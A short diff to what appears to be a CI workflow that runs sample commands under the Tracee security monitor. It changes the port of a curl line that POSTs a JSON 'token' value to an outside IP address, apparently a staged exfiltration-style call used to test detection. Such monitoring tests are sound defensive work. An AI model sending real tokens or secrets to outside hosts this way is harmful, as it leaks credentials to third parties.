@@ -20,6 +20,6 @@ jobs:
         echo "hoge" > ./hoge.txt
         cat hoge.txt
         dig example.com
-        curl -X POST -H "Content-Type: application/json" -d '{"token":"hoge"}' http://160.251.233.248:45555/
+        curl -X POST -H "Content-Type: application/json" -d '{"token":"hoge"}' http://160.251.233.248:22355
     - name: Stop Tracee
       uses: ./.github/actions/stop
